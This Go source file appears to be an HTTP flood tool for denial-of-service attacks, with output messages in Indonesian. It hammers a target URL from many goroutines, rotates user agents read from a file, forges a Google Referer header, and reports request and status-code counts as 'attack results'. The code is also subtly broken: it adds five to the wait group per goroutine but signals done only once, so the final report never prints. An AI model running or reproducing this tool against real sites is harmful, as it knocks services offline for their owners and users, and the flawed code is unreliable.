package main

import (
	"fmt"
	"math/rand"
	"os"
	"strconv"
	"sync"
	"sync/atomic"
	"time"

	"github.com/valyala/fasthttp"
)

var (
	userAgents   []string
	successCount uint64
	errorCount   uint64
	statusCodes  = make(map[int]uint64)
	mutex        sync.Mutex
)

func init() {
	rand.Seed(time.Now().UnixNano())
	userAgents = readLines("ua.txt")
}

func readLines(filename string) []string {
	content, err := os.ReadFile(filename)
	if err != nil {
		fmt.Printf("Error membaca file %s: %v\n", filename, err)
		os.Exit(1)
	}
	return splitLines(string(content))
}

func splitLines(data string) []string {
	lines := []string{}
	for _, line := range split(data, '\n') {
		lines = append(lines, line)
	}
	return lines
}

func split(s string, sep rune) []string {
	var res []string
	lastIndex := 0
	for i, c := range s {
		if c == sep {
			res = append(res, s[lastIndex:i])
			lastIndex = i + 1
		}
	}
	if lastIndex < len(s) {
		res = append(res, s[lastIndex:])
	}
	return res
}

func randomElement(elements []string) string {
	if len(elements) == 0 {
		return ""
	}
	return elements[rand.Intn(len(elements))]
}

func attack(targetURL string, duration time.Duration, wg *sync.WaitGroup) {
	defer wg.Done()
	client := &fasthttp.Client{}

	startTime := time.Now()
	for time.Since(startTime) < duration {
		req := fasthttp.AcquireRequest()
		resp := fasthttp.AcquireResponse()

		req.SetRequestURI(targetURL)
		req.Header.Set("User-Agent", randomElement(userAgents))
		req.Header.Set("Referer", "https://google.com")

		err := client.Do(req, resp)
		if err != nil {
			atomic.AddUint64(&errorCount, 1)
		} else {
			atomic.AddUint64(&successCount, 1)
			statusCode := resp.StatusCode()
			mutex.Lock()
			statusCodes[statusCode]++
			mutex.Unlock()
		}

		fasthttp.ReleaseRequest(req)
		fasthttp.ReleaseResponse(resp)
	}
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: go run main.go <target> <duration> [threads]")
		os.Exit(1)
	}

	target := os.Args[1]
	duration, _ := time.ParseDuration(os.Args[2] + "s")

	threads := 10
	if len(os.Args) > 3 {
		t, err := strconv.Atoi(os.Args[3])
		if err == nil && t > 0 {
			threads = t
		}
	}

	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(5)
		go attack(target, duration, &wg)
	}

	wg.Wait()

	// Print hasil akhir
	fmt.Println("\n=== Hasil Serangan ===")
	fmt.Printf("Total request terkirim : %d\n", successCount+errorCount)
	fmt.Printf("Request sukses         : %d\n", successCount)
	fmt.Printf("Request gagal          : %d\n", errorCount)
	fmt.Println("\nStatus Code Diterima:")
	for code, count := range statusCodes {
		fmt.Printf("  %d : %d kali\n", code, count)
	}
}
